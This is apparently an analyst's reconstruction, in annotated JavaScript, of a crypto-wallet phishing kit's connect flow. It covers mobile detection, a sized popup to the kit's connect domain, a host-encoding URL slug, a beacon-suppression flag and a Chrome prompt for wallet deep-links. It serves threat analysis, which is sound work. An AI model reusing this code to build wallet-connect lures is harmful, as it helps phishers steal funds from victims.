/**
 * Mobile detection, platform branching, and the popup / embedded flow.
 *
 * The kit takes a fundamentally different path on mobile vs desktop:
 *
 *   desktop  → open a 360×450 popup to the connect domain
 *   mobile   → embedded flow in the same page, plus wallet deep-links
 *
 * String-table evidence:
 *   [174] "Macintosh|Mac OS X"           — desktop UA pattern
 *   [353] "iPhone|iPad|Android"          — mobile UA pattern
 *   [188] "width=360,height=450,top="    — popup window.open() specs (desktop)
 *   [189] ",scrollbars=no,resizable=no"  — popup window.open() specs cont'd
 *   [187] "/connect/"                    — connect path prefix
 *   [180] "Please open this page in Chrome to continue with " — Chrome nag
 *
 * Globals evidence:
 *   "e8INIm" → "innerWidth"   — used for the mobile branch check
 *   "Ffa2Lm" → "window"       — global window reference
 *   "LA7MQr9"→ "outerHeight"  — used for popup positioning
 *   "Bcmh3eW"→ "resizeTo"     — the connect popup is resized after open
 *   "TRyvdo" → "moveTo"       — popup repositioning
 *
 * Constants:
 *   360, 450  — popup width and height
 *
 * === Desktop connect flow ===
 *
 * On desktop the kit calls window.open() with carefully crafted specs
 * to produce a 360×450 floating popup positioned near the top of the screen:
 *
 *   const connectToken = generateConnectToken(); // base-x random slug
 *   const connectUrl = "https://" + connectDomain
 *                    + "/connect/" + connectToken + "?b=1";
 *   const popupSpecs = "width=360,height=450,top=" + topOffset
 *                    + ",left=" + leftOffset
 *                    + ",scrollbars=no,resizable=no";
 *   const popup = window.open(connectUrl, "_blank", popupSpecs);
 *   if (popup) {
 *     popup.resizeTo(360, 450);
 *     popup.moveTo(leftOffset, topOffset);
 *   }
 *
 * The ?b=1 flag tells the connect domain not to send a /api/visit beacon
 * (the lure page already sent one). The token is a base-x encoded slug
 * using the alphabet "wrqeh3gsb2ca1pjykixvo46zf98unm57ld0t_-" [179].
 *
 * === Mobile connect flow ===
 *
 * On mobile (window.innerWidth < 768 OR UA matches iPhone|iPad|Android):
 *
 * Instead of a popup the kit uses the embedded path — the wallet modal
 * is initialized in-page, and deep-links are constructed for each wallet
 * the victim selects. The connect domain shim does the same thing but
 * is loaded via a redirect instead of a popup. See wallet_deeplinks.js
 * for the per-wallet deep-link construction.
 *
 * === Chrome nag ===
 *
 * String [180]: "Please open this page in Chrome to continue with "
 * This is alert()ed if the victim's browser is non-Chrome on Android
 * (some wallet deep-link schemes only work from Chrome). The kit
 * appends the wallet name to the message.
 */

const MOBILE_UA = /iPhone|iPad|Android/i;      // getString(353)
const DESKTOP_UA = /Macintosh|Mac OS X/i;      // getString(174)
const MOBILE_WIDTH_THRESHOLD = 768;

function isMobile() {
  if (MOBILE_UA.test(navigator.userAgent)) return true;
  if (window.innerWidth < MOBILE_WIDTH_THRESHOLD) return true;
  return false;
}

/**
 * generateConnectToken() — base-x (custom alphabet) random slug,
 * used as the path component of the connect domain URL.
 * Alphabet: "wrqeh3gsb2ca1pjykixvo46zf98unm57ld0t_-"  (getString(179))
 * Length: typically 20-26 characters (observed in easyinvest7.biz captures).
 *
 * Encoded form of the page host is the slug's payload (浚/pageHost()),
 * so the connect domain can reconstruct apiHost without a query string.
 */
function generateConnectToken(pageHost) {
  return baseXEncode(new TextEncoder().encode(pageHost), SLUG_ALPHABET);
}

const POPUP_W = 360;  // getString(188) width component
const POPUP_H = 450;  // getString(188) height component

function openConnectPopup(connectDomain, connectToken) {
  const url = "https://" + connectDomain + "/connect/" + connectToken + "?b=1";
  const left = Math.round((window.screen.width - POPUP_W) / 2);
  const top  = Math.round((window.screen.height - POPUP_H) / 4);
  const specs = "width=" + POPUP_W + ",height=" + POPUP_H
              + ",top=" + top + ",left=" + left
              + ",scrollbars=no,resizable=no";
  const popup = window.open(url, "_blank", specs);
  if (popup) {
    popup.resizeTo(POPUP_W, POPUP_H);
    popup.moveTo(left, top);
  }
  return popup;
}
